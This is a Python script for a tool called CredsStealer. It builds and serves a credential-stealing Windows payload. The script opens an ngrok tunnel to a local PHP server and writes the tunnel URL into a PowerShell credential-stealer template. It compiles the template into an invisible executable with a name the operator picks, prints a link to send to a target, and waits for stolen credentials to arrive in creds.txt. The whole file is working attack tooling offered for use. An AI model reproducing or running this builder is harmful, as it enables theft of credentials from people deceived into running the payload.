from os import system, path, rename
from time import sleep
import re
import multiprocessing
from wget import download
from platform import system as systemos, architecture

RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
def banner():
    print(r"""
	
	          ____              _     ____  _             _           
		 / ___|_ __ ___  __| |___/ ___|| |_ ___  __ _| | ___ _ __ 
		| |   | '__/ _ \/ _` / __\___ \| __/ _ \/ _` | |/ _ \ '__|
		| |___| | |  __/ (_| \__ \___) | ||  __/ (_| | |  __/ |   
		 \____|_|  \___|\__,_|___/____/ \__\___|\__,_|_|\___|_|   
		                                                          
						       



    """)

def checkNgrok():
    if path.isfile('ngrok') == False: 
        print("[*] Ngrok Not Found !!")
        print("[*] Downloading Ngrok...")
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

system('rm *.exe 2> /dev/null')
system('cp Template/CredsStealer.ps1 ./ > /dev/null')
system('cp Template/Ps1_To_Exe_x64.exe ./ > /dev/null')
system('cp Template/Ps1_To_Exe.exe ./ > /dev/null')
system("rm creds.txt 2> /dev/null")
system("touch creds.txt")


def runServer():
    print(GREEN + " [+] Starting php\n"+ DEFAULT)
    system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")



def ngrok():
    print(GREEN + " [+] Starting ngrok\n"+ DEFAULT)
    system("./ngrok http 8080 > /dev/null &")
    
    sleep(6)
    system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    urlFile = open('ngrok.url', 'r')
    global url
    url = urlFile.read().rstrip("\n")
    urlFile.close()
    
        

def subst():           
    with open('CredsStealer.ps1', "r+") as ps1:
        s=ps1.read()
        ret = re.sub("ngrok_link", url, s)
        ps1.seek(0)
        ps1.write(ret)
        


def compile():
    cmp = input(" [+] Windows system type you want to compile for x86/x64: ")    
    if cmp == 'x64':
        global payload
        payload = input(" [+] Payload name without extension: ")
        print(GREEN + " [+] Compiling to exe" + DEFAULT)
        system("wine Ps1_To_Exe_x64.exe /ps1 CredsStealer.ps1 /exe creds.exe /x64 /invisible")
        rename("creds.exe", payload + ".exe")
        print(CYAN + " [+] Output file " + payload + ".exe" + " generated" + DEFAULT)
    elif cmp == 'x86':
        payload = input(" [+] Payload name without extension: ")
        print(GREEN + " [+] Compiling to exe" + DEFAULT)
        system("wine Ps1_To_Exe.exe /ps1 CredsStealer.ps1 /exe creds.exe /invisible")
        rename("creds.exe", payload + ".exe")
        print(CYAN + " [+] Output file " + payload + ".exe" + " generated" + DEFAULT)
    else:
        compile()    

def getcords():
    print(GREEN + "\n [+] Send the direct link to target " + DEFAULT + CYAN + url + "/" + payload + ".exe" + DEFAULT)
    print(GREEN + "\n [+] Waiting for creds"+ DEFAULT)
    while True:
        
        with open('creds.txt') as cords:
            lines = cords.read().rstrip()
            if len(lines) != 0:
                print(CYAN + "\n[*] Creds received\n" + DEFAULT)
                system("cat creds.txt")
                system("rm creds.txt")
                system("touch creds.txt") 

if __name__ == "__main__":
    try:
        banner()
        multiprocessing.Process(target=runServer).start()
        ngrok()
        subst()
        compile()
        getcords()
    except KeyboardInterrupt:
        exit(0)
